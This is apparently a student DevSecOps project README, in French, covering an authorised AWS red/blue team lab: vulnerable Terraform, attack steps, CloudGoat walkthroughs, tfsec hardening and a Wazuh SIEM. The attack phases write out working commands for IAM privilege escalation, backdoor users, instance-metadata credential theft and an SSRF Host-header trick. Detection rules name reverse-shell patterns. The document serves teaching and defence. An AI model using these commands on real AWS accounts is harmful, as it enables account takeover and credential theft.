# Lab Red/Blue Team sur Infrastructure Cloud Hardenée

> **Projet de Fin de Semestre — DevSecOps | ENSA Marrakech | 2025–2026**
> Simulation d'attaques cloud, hardening Infrastructure as Code, et déploiement d'un SOC automatisé

[![Deploy SOC Infrastructure](https://github.com/NoussairBN/SOC-as-Service/actions/workflows/deploy.yml/badge.svg)](https://github.com/NoussairBN/SOC-as-Service/actions/workflows/deploy.yml)
[![Shift-Left Security Scan](https://github.com/NoussairBN/SOC-as-Service/actions/workflows/security-scan.yml/badge.svg)](https://github.com/NoussairBN/SOC-as-Service/actions/workflows/security-scan.yml)
![Terraform](https://img.shields.io/badge/Terraform-1.7+-7B42BC?logo=terraform)
![Ansible](https://img.shields.io/badge/Ansible-2.14+-EE0000?logo=ansible)
![AWS](https://img.shields.io/badge/AWS-us--east--1-FF9900?logo=amazonaws)
![Wazuh](https://img.shields.io/badge/Wazuh-4.11-005571)

---

## Informations du projet

| Champ | Valeur |
|---|---|
| **Etablissement** | Ecole Nationale des Sciences Appliquees de Marrakech (ENSA-M) |
| **Filiere** | GCDSTE — CI2 |
| **Encadrant** | ACHABROU OMAR |
| **Etudiants** | AMHIRAQ ABDELHAKIM — BOUANANI NOUSSAIR |
| **Annee universitaire** | 2025 – 2026 |
| **Budget realise** | ~0 € (AWS Free Tier) |
| **Duree** | 8 semaines |

---

## Table des matieres

1. [Resume executif](#1-resume-executif)
2. [Problematique et objectifs](#2-problematique-et-objectifs)
3. [Architecture globale du projet](#3-architecture-globale-du-projet)
4. [Phase 1 — Setup et POC IaC](#4-phase-1--setup-et-poc-iac)
5. [Phase 2 — Red Team : pentest de l'infrastructure IaC](#5-phase-2--red-team--pentest-de-linfrastructure-iac)
6. [Phase 3 — CloudGoat : labs de pentesting AWS](#6-phase-3--cloudgoat--labs-de-pentesting-aws)
7. [Phase 4 — Hardening DevSecOps et pipeline CI/CD](#7-phase-4--hardening-devsecops-et-pipeline-cicd)
8. [Phase 5 — SOC-as-Code : deploiement automatise du SIEM](#8-phase-5--soc-as-code--deploiement-automatise-du-siem)
9. [Metriques before / after](#9-metriques-before--after)
10. [Stack technologique](#10-stack-technologique)
11. [Structure du depot SOC-as-Service](#11-structure-du-depot-soc-as-service)
12. [Deploiement et utilisation](#12-deploiement-et-utilisation)
13. [Couts AWS estimes](#13-couts-aws-estimes)
14. [Engagement ethique](#14-engagement-ethique)

---

## 1. Resume executif

Ce projet de fin de semestre realise le cycle complet **attaque → audit → hardening → detection** sur une infrastructure AWS deployee via Infrastructure as Code (Terraform). Il materialise les trois piliers du DevSecOps moderne :

- **Security-as-Code** : les regles de detection SIEM, le hardening IaC et les politiques IAM sont versionnees et reproductibles.
- **Shift-Left Security** : les vulnerabilites sont detectees dans le code avant tout deploiement AWS, pas apres une breach.
- **Automatisation totale** : un seul `git push` declenche la chaine complete scan → infra → configuration → SIEM operationnel.

Le projet est structure en cinq phases progressives :

| Phase | Titre | Resultat cle |
|---|---|---|
| 1 | Setup et POC IaC | Environnement DevSecOps operationnel (AWS + WSL2 + CloudGoat) |
| 2 | Red Team IaC | 5/5 attaques reussies sur infra Terraform — compromission totale |
| 3 | Labs CloudGoat | 2 scenarios d'escalade de privileges et SSRF exploites et remedies |
| 4 | Hardening DevSecOps | 19 → 0 findings (tfsec) + auto-remediation via Pull Request |
| 5 | SOC-as-Code | SIEM Wazuh deploye en un `git push` — detection d'attaques validee |

---

## 2. Problematique et objectifs

### Problematique

Comment concevoir, attaquer et securiser une infrastructure cloud AWS dans un cycle DevSecOps complet, en utilisant des outils professionnels et un workflow reproductible via l'Infrastructure as Code ?

### Objectifs specifiques

| # | Objectif | Indicateur de reussite |
|---|---|---|
| O1 | Deployer une infrastructure AWS vulnerable via Terraform | Lab fonctionnel, repo Git tague v1-vuln |
| O2 | Exploiter les vulnerabilites identifiees (5 scenarios) | Preuves d'exploitation documentees, TTP MITRE |
| O3 | Realiser deux labs CloudGoat sur scenarios reels | Writeups complets avec kill chain |
| O4 | Hardener l'infrastructure via correction du code Terraform | Pipeline vert — 0 finding tfsec |
| O5 | Deployer Wazuh SIEM et creer des regles de detection | Alertes level 10+ en temps reel |
| O6 | Automatiser le deploiement SOC complet via CI/CD | Infrastructure operationnelle en un `git push` |

---

## 3. Architecture globale du projet

```
PHASE 1          PHASE 2           PHASE 3           PHASE 4           PHASE 5
  Setup      →   Red Team     →  CloudGoat Labs  →  Hardening     →   SOC-as-Code
  IaC POC        5 attaques        2 scenarios        Pipeline          Wazuh SIEM
                 CRITIQUE          IAM + SSRF         0 findings        Detection live
```

### Architecture AWS — Phase 5 (SOC-as-Code)

```
+----------------------------------------------------------------------+
|                          AWS us-east-1                               |
|                                                                      |
|  +---------------------------------------+                           |
|  |    VPC Client  (10.0.0.0/16)          |                           |
|  |                                       |                           |
|  |  [Subnet Public 10.0.1.0/24]          |  [Subnet Prive 10.0.2.0/24] |
|  |  Bastion Host (t3.micro)              |  DVWA (t3.micro)          |
|  |  EIP publique — SSH admin             |  + Wazuh Agent            |
|  |  NAT Gateway                          |  Metasploitable (t3.micro)|
|  |                                       |  + Wazuh Agent            |
|  +-------------------+-------------------+                           |
|                      | VPC Peering (routes bidirectionnelles)        |
|  +-------------------+-------------------+                           |
|  |    VPC SOC  (10.1.0.0/16)             |                           |
|  |  [Subnet Public 10.1.1.0/24]          |                           |
|  |  Wazuh All-in-One (c7i-flex.large)    |                           |
|  |  Manager (1514/1515) + Indexer (9200) |                           |
|  |  Dashboard HTTPS (:443) — EIP pub     |                           |
|  +---------------------------------------+                           |
|                                                                      |
|  S3 (tfstate) + native S3 locking (Terraform 1.10+)                 |
+----------------------------------------------------------------------+

Flux :
  Admin → Bastion (EIP) —ProxyJump—> Instances privees
  Agents → VPC Peering → Wazuh Manager (1514/1515)
  Admin → Wazuh EIP (HTTPS 443) → Dashboard
```

---

## 4. Phase 1 — Setup et POC IaC

**Responsable :** Noussair Bouanani

### 4.1 Compte AWS et securisation IAM

- Activation du **MFA** sur le compte Root
- Creation d'un utilisateur IAM dedie `pfs-admin` avec acces programmatique (Access Keys)
- Application du **principe du moindre privilege** — le compte Root n'est jamais utilise pour les operations IaC
- Region principale : `eu-west-3` (Paris) — region `us-east-1` (N. Virginie) pour les labs CloudGoat

### 4.2 Environnement local (WSL2 + Ubuntu)

Adoption de **WSL2 avec Ubuntu 24.04** au lieu de Windows natif ou d'une VM :

| Avantage | Justification |
|---|---|
| Compatibilite native | Les outils DevSecOps (Terraform, AWS CLI, Python) sont concus pour Linux |
| Performances E/S | Operations sur systeme de fichiers Linux natif — significativement plus rapides que NTFS |
| Isolation antivirus | CloudGoat deployant des scenarios de hacking, Windows Defender supprime certains fichiers sur NTFS |

Repertoire de travail migre vers `~/` (systeme Linux natif) pour eviter les faux positifs.

### 4.3 Outils deployes

```bash
# AWS CLI v2 — gestion et interaction avec l'API AWS
aws configure --profile pfs-admin

# Terraform v1.14.9 via depots APT HashiCorp
terraform version

# CloudGoat (Rhino Security Labs) dans un venv Python isole
pip install .
python cloudgoat.py config profile pfs-admin
```

**Choix venv Python :** Ubuntu 24.04 bloque l'installation globale de modules Python (PEP 668 — `externally-managed-environment`). Le venv isole les dependances du projet et permet l'installation via `pip install .` (Poetry/pyproject.toml).

---

## 5. Phase 2 — Red Team : pentest de l'infrastructure IaC

**Responsables :** AMHIRAQ Abdelhakim + BOUANANI Noussair
**Periode :** 26–27 avril 2026
**Perimetre :** Compte AWS prive 341738837313 — Region eu-west-3 (Paris)
**Resultat global :** COMPROMISSION TOTALE — 5/5 attaques reussies

### 5.1 Infrastructure vulnerable deployee

Infrastructure codee en HCL et deployee via Terraform v1.6 — 16 ressources AWS :

| Composant | Description | Vulnerabilite |
|---|---|---|
| VPC `10.0.0.0/16` | Reseau isole | — |
| EC2 `i-070ac58b3e5b5b790` | Amazon Linux 2, t3.micro, IP pub `51.44.178.233` | IMDSv1 actif, role IAM wildcard |
| Security Group | 4 regles ingress + 1 egress | SSH/HTTP/ICMP ouverts a `0.0.0.0/0` |
| S3 `lab-data-bucket-2026` | Stockage avec ACL `public-read` | Acces sans authentification |
| IAM `lab-ec2-vuln-role` | Role EC2 avec `Action: "*"` | Privilege admin total |
| IAM `lab-victim-user` | User avec `iam:AttachUserPolicy` | Escalade de privileges |

### 5.2 Les 5 attaques realisees — Kill Chain complete

#### Attaque 1 — Exfiltration de donnees S3 publiques
**MITRE ATT&CK :** T1530, T1213 — *Data from Cloud Storage Object*

```bash
# Telechargement sans authentification AWS
curl https://lab-data-bucket-2026.s3.eu-west-3.amazonaws.com/credentials.txt

# Donnees exfiltrees :
# DB_PASS=Admin1234!
# API_KEY=sk-abc123xyz
# SSH_USER=admin
```

**Impact :** Compromission immediate de credentials applicatifs. Aucun journal IAM ne trace cette attaque (pas d'authentification requise).

---

#### Attaque 2 — Escalade de privileges IAM
**MITRE ATT&CK :** T1078.004, T1098.003 — *Account Manipulation: Additional Cloud Roles*

```bash
# Avec les credentials voles de lab-victim-user :
aws configure --profile victim

# EXPLOIT — Auto-attribution AdministratorAccess
aws iam attach-user-policy \
  --user-name lab-victim-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile victim
```

**Mecanisme :** La permission `iam:AttachUserPolicy` permet d'attacher n'importe quelle policy AWS a son propre compte — transformation d'un acces basique en acces administrateur complet en une commande.

---

#### Attaque 3 — Creation de backdoor IAM (compte maintenance-bot)
**MITRE ATT&CK :** T1136.003, T1098.001 — *Create Account: Cloud Account*

```bash
aws iam create-user --user-name maintenance-bot --profile victim
aws iam attach-user-policy \
  --user-name maintenance-bot \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile victim
aws iam create-access-key --user-name maintenance-bot --profile victim
```

**Impact :** Persistance garantie — acces admin meme si la victime change ses credentials.

---

#### Attaque 4 — Vol de credentials via SSRF IMDSv1
**MITRE ATT&CK :** T1552.005 — *Unsecured Credentials: Cloud Instance Metadata API*

```bash
# Depuis l'EC2 (IMDSv1 actif — http_tokens = "optional") :
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# > lab-ec2-vuln-role

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-ec2-vuln-role
# > AccessKeyId, SecretAccessKey, Token (role admin Action:* complet)
```

**Analogie reelle :** Cette technique exacte a ete utilisee dans la breach Capital One (2019, 100 millions de comptes voles).

---

#### Attaque 5 — Compromission totale du compte AWS
**MITRE ATT&CK :** T1087.004, T1530, T1136.003

Avec les credentials du role IAM voles via IMDSv1 (`Action: "*"`) :
- Enumeration complete de tous les utilisateurs IAM et buckets S3
- Creation d'un second backdoor `backdoor-pwn` avec AdministratorAccess
- Lecture complete du bucket S3

### 5.3 Kill Chain documentee

| Etape | Phase Cyber Kill Chain | Action | Vulnerabilite |
|---|---|---|---|
| 1 | Reconnaissance | Enumeration buckets S3 publics | ACL `public-read` |
| 2 | Initial Access | Exfiltration `credentials.txt` | Pas d'authentification S3 |
| 3 | Privilege Escalation | Auto-attachement `AdministratorAccess` | `iam:AttachUserPolicy` |
| 4 | Persistence | Creation `maintenance-bot` + cles | `iam:CreateUser` |
| 5 | Credential Access | `curl 169.254.169.254` IMDSv1 | `http_tokens = optional` |
| 6 | Discovery | `aws iam list-users` + `aws s3 ls` | Role `Action: *` |
| 7 | Persistence (2eme) | Creation `backdoor-pwn` | Role `Action: *` |
| 8 | Collection | Lecture complete bucket S3 | Compromission totale |

**Resultat :** 3 vecteurs d'acces admin independants obtenus. Compromission totale en < 5 minutes depuis des credentials de faible privilege.

### 5.4 Vulnerabilites identifiees — Tableau de synthese

| # | Vulnerabilite | Criticite | Impact |
|---|---|---|---|
| V1 | Bucket S3 public avec donnees sensibles | CRITIQUE | Exfiltration sans authentification |
| V2 | Policy IAM permissive (`iam:AttachUserPolicy`) | CRITIQUE | Escalade vers `AdministratorAccess` |
| V3 | IMDSv1 actif + role IAM wildcard `*` | CRITIQUE | Vol des credentials du role EC2 |
| V4 | Security Group ouvert (SSH, HTTP a `0.0.0.0/0`) | HAUTE | Surface d'attaque exposee internet |
| V5 | Secrets hardcodes (mots de passe, API keys) | HAUTE | Compromission applicative |

---

## 6. Phase 3 — CloudGoat : labs de pentesting AWS

CloudGoat est le framework de lab securite AWS de **Rhino Security Labs** — environnements AWS intentionnellement vulnerables reproduisant des scenarios de breaches reelles.

### 6.1 Lab 1 — `iam_privesc_by_attachment` (Hakim)

**Objectif :** Partir de l'utilisateur IAM *Kerrigan* avec permissions limitees, escalader vers Admin, et terminer l'instance EC2 cible *cg-super-critical-security-server*.

**Chain d'attaque :**

```
Kerrigan (privileges limites)
  |
  | 1. List instance profiles → decouverte de cg-ec2-mighty-role (admin)
  v
iam:RemoveRoleFromInstanceProfile  →  swap "meek" par "mighty"
iam:AddRoleToInstanceProfile
  |
  | 2. Run-instances avec instance profile modifie
  v
EC2 attaquant (herite du role admin "mighty")
  |
  | 3. curl IMDS → credentials temporaires admin
  v
Profil AWS "mighty" configure
  |
  | 4. terminate-instances i-0b58a7b09b66e3276
  v
Objectif atteint — instance cible terminee
```

**Exploitation :**

```bash
# Swap du role dans l'instance profile
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-cgidkk0p8r8tkk \
  --role-name cg-ec2-meek-role-cgidkk0p8r8tkk --profile kerrigan

aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-cgidkk0p8r8tkk \
  --role-name cg-ec2-mighty-role-cgidkk0p8r8tkk --profile kerrigan

# Lancement d'une EC2 avec le profil admin
aws ec2 run-instances --image-id ami-0647fb535573be346 --instance-type t3.micro \
  --iam-instance-profile Name=cg-ec2-meek-instance-profile-cgidkk0p8r8tkk \
  --key-name pwned --region us-east-1 --profile kerrigan

# Vol des credentials via IMDS
ssh -i pwned.pem ubuntu@13.219.249.81
curl 169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-cgidkk0p8r8tkk
# > AccessKeyId + SecretAccessKey + SessionToken (admin complet)

# Objectif atteint
aws ec2 terminate-instances --instance-ids i-0b58a7b09b66e3276 --profile mighty
```

**Remediation :** Principe du moindre privilege — ne jamais accorder `iam:AddRoleToInstanceProfile` sans restriction de ressource. Activer IMDSv2 (`http_tokens = required`). Surveiller CloudTrail sur `AddRoleToInstanceProfile` et `RunInstances`.

---

### 6.2 Lab 2 — `cloud_breach_s3` + SSRF (Noussair)

**Objectif :** Exploiter une faille SSRF sur un proxy Nginx mal configure pour voler des credentials IAM via IMDSv1 et acceder aux buckets S3.

**Infrastructure cible :** Instance EC2 (proxy Nginx sur `100.53.65.27`) avec role IAM `cg-banking-WAF-Role` possedant `AmazonS3FullAccess`.

**Exploitation :**

```bash
# 1. Decouverte du role IAM via SSRF sur le proxy Nginx
curl --header "Host: 169.254.169.254" \
  http://100.53.65.27/latest/meta-data/iam/security-credentials/

# 2. Extraction des credentials temporaires
curl --header "Host: 169.254.169.254" \
  http://100.53.65.27/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-<CGID>
# > AccessKeyId + SecretAccessKey + SessionToken

# 3. Impact critique — acces a TOUS les buckets S3 du compte
aws configure --profile breached  # avec les credentials voles
aws sts get-caller-identity --profile breached
aws s3 ls --profile breached  # liste TOUS les buckets
```

**Audit IaC :**

```bash
# Identification de la cause racine dans le code Terraform
grep -n "AmazonS3FullAccess" *.tf
# ec2.tf:21:  "arn:aws:iam::aws:policy/AmazonS3FullAccess"  <- FAILLE
```

**Remediation — Principe du moindre privilege :**

```hcl
# Remplacement de AmazonS3FullAccess par une politique sur mesure
resource "aws_iam_policy" "least_privilege_s3" {
  name = "cg-least-privilege-s3-${var.cgid}"
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect   = "Allow"
        Action   = ["s3:ListBucket"]
        Resource = [aws_s3_bucket.cg-cardholder-data-bucket.arn]
      },
      {
        Effect   = "Allow"
        Action   = ["s3:GetObject"]
        Resource = ["${aws_s3_bucket.cg-cardholder-data-bucket.arn}/*"]
      }
    ]
  })
}
```

**Validation post-hardening :**

| Test | Commande | Resultat |
|---|---|---|
| Acces global bloque | `aws s3 ls --profile breached` | AccessDenied |
| Acces metier conserve | `aws s3 ls s3://cg-cardholder-data-bucket-<CGID> --profile breached` | OK |

---

## 7. Phase 4 — Hardening DevSecOps et pipeline CI/CD

**Responsable principal :** AMHIRAQ Abdelhakim
**Repository :** `github.com/AMHIRAQ/devsecops-lab` (prive)
**Outil de scan :** tfsec v1.28.14 (Aqua Security)

### 7.1 Concept Shift-Left Security

Le pipeline empeche **physiquement** le deploiement de code vulnerable sur AWS. Chaque `git push` declenche automatiquement tfsec qui **bloque** le pipeline en cas de vulnerabilite HIGH ou CRITICAL. La securite est integree en amont du cycle de deploiement — pas en bout de chaine.

```
git push
   |
   v
GitHub Actions
   |
   +-- terraform fmt --check
   |
   +-- terraform init -backend=false
   |
   +-- terraform validate
   |
   +-- tfsec . --minimum-severity HIGH
         |
         +-- HIGH/CRITICAL detecte --> ECHEC (code ne peut pas atteindre AWS)
         |
         +-- 0 finding --> SUCCES (deploiement autorise)
```

### 7.2 Hardening du lab perso — 19 findings → 0

**Branche `vulnerable` → branche `hardened`** — 8 runs iteratifs :

| # | Severite | Vulnerabilite tfsec | Lien avec exploitation Phase 2 | Correctif applique |
|---|---|---|---|---|
| 1 | CRITICAL | Secret dans `user_data` (`DB_PASSWORD=Admin1234!`) | Secret visible console AWS | Suppression de la ligne — variables sensibles |
| 2-4 | CRITICAL | SG ingress `0.0.0.0/0` (SSH, HTTP, ICMP) | Ports SSH exposes — brute force + nmap | `cidr_blocks = ["105.73.96.213/32"]` |
| 5 | CRITICAL | SG egress `0.0.0.0/0` sans restriction | Exfiltration de donnees | Egress port 443 vers `10.0.0.0/8` uniquement |
| 6-7 | HIGH | IAM policy `Action=*`, `Resource=*` | Acces admin total via role EC2 — exploite via IMDSv1 | Actions specifiques `s3:GetObject`, `s3:ListBucket` |
| 8-10 | HIGH | `iam:AttachUserPolicy` sans restriction | Escalade de privileges Phase 2 | Principe du moindre privilege |
| 11 | HIGH | Subnet avec IP publique automatique | EC2 exposee directement internet | `map_public_ip_on_launch = false` |
| 13 | HIGH | IMDSv1 actif (`http_tokens=optional`) | Vol de credentials via SSRF — exploite | `http_tokens = "required"` (IMDSv2) |
| 16-19 | HIGH | S3 public (`block_public_acls=false` x4) | Exfiltration `credentials.txt` | `block_public_acls = true` + chiffrement AES256 |

**Resultat :** Branche `vulnerable` → pipeline FAILURE. Branche `hardened` → pipeline SUCCESS (18 checks passes, 0 CRITICAL, 0 HIGH).

### 7.3 Hardening du scenario CloudGoat — 13 findings → 0

Meme approche appliquee au code Terraform original du scenario CloudGoat `iam_privesc_by_attachment` :

| Fichier | Avant | Apres |
|---|---|---|
| `ec2.tf` | Egress `0.0.0.0/0`, IMDSv1 | Egress port 443, `http_tokens=required`, EBS chiffre |
| `iam.tf` | `iam:AddRoleToInstanceProfile` sur `Resource=*` | `#tfsec:ignore` avec justification (scenario intentionnel) |
| `iam_mighty.tf` | `Action=*`, `Resource=*` | Actions EC2 specifiques + `#tfsec:ignore` |
| `vpc.tf` | `map_public_ip_on_launch = true` | `map_public_ip_on_launch = false` |

**Resultat :** 4 CRITICAL + 9 HIGH → **0 finding — No problems detected!** Pipeline vert en 22 secondes.

### 7.4 Auto-remediation — Pipeline avec Pull Request automatique

Evolution du pipeline : non seulement detection, mais **correction automatique** via `auto_fix.py` :

```
git push (branche vulnerable)
   |
   +-- JOB 1 : tfsec scan → tfsec-results.json
   |
   +-- JOB 2 : auto_fix.py
         |
         +-- Lecture du JSON → identification des long_id
         |
         +-- Corrections mecaniques automatiques :
         |     - IMDSv2 (http_tokens: optional → required)
         |     - EBS chiffrement (root_block_device.encrypted = true)
         |     - S3 public (block_public_* false → true)
         |     - Secret user_data supprime
         |     - Subnet IP publique desactivee
         |     - Egress restreint (port 443 uniquement)
         |
         +-- Exceptions metier documentees (#tfsec:ignore) :
         |     - IAM wildcards (demonstration necessaire du lab)
         |     - Ingress public (lab pentest intentionnel)
         |
         +-- peter-evans/create-pull-request → PR automatique
               "[Security] Auto-fix X tfsec findings"
               Labels: auto-fix, security
               Review humaine → merge
```

**Metriques auto-remediation :**

| Etape | CRITICAL | HIGH | Total |
|---|---|---|---|
| Etat initial | 5 | 14 | 19 findings |
| Apres PR auto-fix | 2 | 8 | 10 findings |
| Apres exceptions documentees | 0 | 0 | 0 finding — SUCCESS |

---

## 8. Phase 5 — SOC-as-Code : deploiement automatise du SIEM

**Responsables :** BOUANANI Noussair (lead) + AMHIRAQ Abdelhakim (support)
**Repository :** `github.com/NoussairBN/SOC-as-Service`

### 8.1 Architecture SOC — Deux VPCs isoles

```
VPC Client (10.0.0.0/16)          VPC SOC (10.1.0.0/16)
+---------------------+            +---------------------+
| Bastion (t3.micro)  |            | Wazuh All-in-One    |
| EIP pub — SSH admin |<--Peering->| (c7i-flex.large)    |
|                     |            | Manager  :1514/1515 |
| DVWA (t3.micro)     |            | Indexer  :9200      |
| + Wazuh Agent       |            | Dashboard :443      |
|                     |            | EIP pub — admin     |
| Metasploitable      |            |                     |
| (t3.micro)          |            |                     |
| + Wazuh Agent       |            |                     |
+---------------------+            +---------------------+
         |                                  ^
         +-- NAT GW (sorties internet) -----+
```

### 8.2 Pipeline CI/CD — un `git push` suffit

```
git push main
    |
    v
JOB 1 : Shift-Left Security (~2 min)
    Checkov (IaC) — soft-fail
    Trivy (IaC) — HIGH/CRITICAL
    |
    v
JOB 2 : Terraform Apply (~5-10 min)
    terraform init (backend S3)
    terraform plan
    terraform apply
    Outputs : IPs des instances
    |
    v
JOB 3 : Ansible Configuration (~20-30 min)
    SSH Config (ProxyJump via Bastion)
    Play 1 : wazuh-server (VPC SOC)
           Installation All-in-One officielle
           Regles custom deployees
           Active Response configure
    Play 2 : dvwa (VPC Client)
           Docker + DVWA
    Play 3 : wazuh-agent (DVWA + Metasploitable)
           Enregistrement aupres du manager
           Demarrage et validation
    |
    v
SOC OPERATIONNEL
    Dashboard : https://<wazuh_pub_ip>
    Agents : Active (2/2)
```

### 8.3 Infrastructure Terraform (modules)

#### Module `networking`

| Ressource | Detail |
|---|---|
| `aws_vpc.client` | VPC cible — `10.0.0.0/16` |
| `aws_vpc.soc` | VPC SOC — `10.1.0.0/16` |
| `aws_subnet.client_public` | Bastion — `10.0.1.0/24` |
| `aws_subnet.client_private` | DVWA + Metasploitable — `10.0.2.0/24` |
| `aws_subnet.soc_public` | Wazuh — `10.1.1.0/24` |
| `aws_nat_gateway` | NAT Gateway (EIP) — sorties internet |
| `aws_vpc_peering_connection` | Peering bidirectionnel Client <-> SOC |

**Security Groups (principe du moindre privilege) :**
- **SG Bastion** : SSH entrant uniquement depuis `var.my_public_ip`
- **SG Client prive** : SSH depuis SG Bastion uniquement ; sorties libres (agents Wazuh + updates)
- **SG Wazuh** : SSH depuis subnet public client (via peering) ; HTTPS/443 depuis IP admin ; ports 1514/1515 depuis VPC Client

#### Module `compute-client`

| Instance | Type | Subnet | EIP | Role |
|---|---|---|---|---|
| `pfs-soc-bastion` | t3.micro | Public | Oui | Jump host SSH, outils pentest (nmap, hydra) |
| `pfs-soc-dvwa` | t3.micro | Prive | Non | Application web vulnerable (DVWA via Docker) |
| `pfs-soc-metasploitable` | t3.micro | Prive | Non | Services reseau vulnerables |

#### Module `compute-soc`

| Instance | Type | vCPU | RAM | Stockage | EIP |
|---|---|---|---|---|---|
| `pfs-soc-wazuh-server` | c7i-flex.large | 2 | 4 GB | 50 Go gp3 (3000 IOPS) | Oui |

#### Backend Terraform (S3 natif)

```hcl
backend "s3" {
  bucket       = "pfs-soc-tfstate-eaysjpih"
  key          = "global/terraform.tfstate"
  region       = "us-east-1"
  use_lockfile = true   # Verrou natif S3 (Terraform >= 1.10)
  encrypt      = true
}
```

Versioning S3 active, chiffrement AES-256, acces public bloque.

### 8.4 Configuration Ansible (roles)

#### Role `wazuh-server`

Installation Wazuh **All-in-One** (Manager + Indexer + Dashboard) via le script officiel 4.x :

| Etape | Detail |
|---|---|
| Swap 2 GB | Requis pour Wazuh Indexer (OpenSearch) sur 4 GB RAM |
| Parametres kernel | `vm.max_map_count=262144`, `vm.swappiness=10` |
| Installation | `wazuh-install.sh -a -i` (async 20 min) |
| Services | `wazuh-manager`, `wazuh-indexer`, `wazuh-dashboard` |
| Enregistrement agents | `use_password=yes` + `authd.pass` |
| Regles custom | Deploiement de `custom_rules.xml` (IDs 100001–100042) |
| Active Response | Auto-ban IP (`firewall-drop`) sur brute-force, scans, attaques web |
| FIM etendu | Surveillance realtime : `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, cron, binaires |

#### Role `wazuh-agent`

- Enregistrement automatique via `ossec-authd` (mot de passe)
- Configuration IP manager depuis les outputs Terraform (`wazuh_private_ip`)
- Demarrage et activation du service

#### Role `dvwa`

- Deploiement DVWA via Docker sur port 80
- Accessible depuis le Bastion pour les tests d'attaque

### 8.5 Regles de detection custom (custom_rules.xml)

| ID | Niveau | Categorie | Description | MITRE |
|---|---|---|---|---|
| 100001 | 10 | SQLi | SQL Injection dans l'URL (union select, drop table, etc.) | T1190 |
| 100002 | 12 | SQLi | Brute-force SQLi — 5+ tentatives en 60s depuis meme IP | T1190 |
| 100003 | 8 | XSS | Cross-Site Scripting (`<script>`, `eval()`, `onerror=`) | T1059.007 |
| 100004 | 9 | LFI | Path Traversal / LFI (`../`, `/etc/passwd`, `/proc/self`) | T1083 |
| 100005 | 8 | Scanner | Web vulnerability scanner (nikto, sqlmap, dirbuster) | T1595 |
| 100010 | 12 | Brute Force | SSH brute force — 5 echecs en 60s | T1110.001 |
| 100011 | 15 | Brute Force | SSH brute force CRITIQUE — 15 echecs → Active Response | T1110.001 |
| 100020 | 12 | PrivEsc | Escalade de privileges via sudo shell/interpreter | T1548.003 |
| 100021 | 14 | PrivEsc | Modification fichier auth systeme (`/etc/passwd`, `/etc/shadow`) | T1098 |
| 100030 | 11 | Persistence | Modification crontab — mecanisme de persistance | T1053.005 |
| 100031 | 14 | Malware | Reverse shell detecte (`bash -i`, `nc -e /bin/`, etc.) | T1059.004 |
| 100040 | 10 | DVWA | Acces aux endpoints vulnerables DVWA | T1190 |
| 100041 | 13 | Injection | OS Command Injection sur DVWA `/vulnerabilities/exec` | T1059 |
| 100042 | 8 | Scanner | Scan web — multiples erreurs 4xx depuis meme IP | T1595.003 |

### 8.6 Active Response — Auto-remediation

| Regle trigger | Action | Cible | Duree |
|---|---|---|---|
| 100011 (SSH brute force critique) | `firewall-drop` (iptables) | Agent local | 1 heure |
| 5763 (brute-force web) | `firewall-drop` | Agent local | 30 minutes |
| 100041 (command injection DVWA) | `firewall-drop` | Tous les agents | 24 heures |

### 8.7 Resultats de detection valides

Lors des tests de la soutenance, avec 884 alertes generees par l'agent `dvwa-client` :

| Regle | Niveau | Description | Statut |
|---|---|---|---|
| 100001 | 10 | SQL Injection detected in web request | Detecte |
| 31106 | 6 | Web attack returned code 200 (success) | Detecte |
| 503 | 3 | Wazuh agent started | Detecte |
| 5402 | 3 | Successful sudo to ROOT executed | Detecte |
| 5715 | 3 | sshd: authentication success | Detecte |

---

## 9. Metriques before / after

### Securite IaC (Phase 4 — Hardening)

| Metrique | Avant hardening | Apres hardening |
|---|---|---|
| Vulnerabilites CRITICAL | 5 | 0 |
| Vulnerabilites HIGH | 14 | 0 |
| Total findings tfsec | 19 | 0 |
| Checks passes | 5 | 18 |
| Statut pipeline | FAILURE | SUCCESS |
| Deploiement AWS autorise | Non | Oui |

### Hardening CloudGoat (iam_privesc_by_attachment)

| Metrique | Avant | Apres |
|---|---|---|
| Findings CRITICAL | 4 | 0 |
| Findings HIGH | 9 | 0 |
| Total findings | 13 | 0 |
| Statut pipeline CloudGoat | FAILURE | SUCCESS |

### SOC Detection

| Metrique | Valeur |
|---|---|
| Agents deployes et actifs | 2 (dvwa-client, metasploitable) |
| Regles custom creees | 14 (IDs 100001–100042) |
| Alertes generees lors des tests | 884 |
| Attaques detectees | SQLi, XSS, LFI, SSH brute force, PrivEsc, Reverse shell |
| Active Response | Operationnel (firewall-drop automatique) |

---

## 10. Stack technologique

| Couche | Technologie | Version | Role |
|---|---|---|---|
| IaC | Terraform | >= 1.7 | Provisionnement de l'infrastructure AWS |
| Config Management | Ansible | >= 2.14 | Installation et configuration des logiciels |
| CI/CD SOC | GitHub Actions | — | Automatisation complete : scan + infra + config |
| CI/CD Hardening | GitHub Actions + tfsec | v1.28.14 | Pipeline shift-left et auto-remediation |
| SIEM / XDR | Wazuh | 4.11 | Detection d'intrusion, FIM, Active Response |
| Lab vulnerable web | DVWA | Latest | Application web vulnerable (SQLi, XSS, LFI) |
| Lab vulnerable reseau | Metasploitable | Ubuntu | Services reseau vulnerables |
| Scan IaC | tfsec (Aqua Security) | v1.28.14 | Detection vulnerabilites IaC avant deploiement |
| Scan IaC (SOC) | Checkov + Trivy | Latest | Analyse securite pipeline SOC-as-Service |
| Labs AWS | CloudGoat | Latest | Scenarios de pentest AWS (Rhino Security Labs) |
| Auto-remediation | Python 3.11 (`auto_fix.py`) | — | Correction automatique des findings tfsec |
| Cloud | AWS EC2 / VPC / S3 / IAM | — | Hebergement cloud us-east-1 + eu-west-3 |
| Backend IaC | AWS S3 (native lock) | — | Etat Terraform distant + verrou |
| Bastion | Ubuntu 22.04 | — | Jump host SSH + outils pentest |
| Referentiel attaque | MITRE ATT&CK Cloud | v14 | Referencement des TTP utilises |

---

## 11. Structure du depot SOC-as-Service

```
SOC-as-Service/
|
+-- .github/
|   +-- workflows/
|       +-- deploy.yml           # Pipeline principal (scan → terraform → ansible)
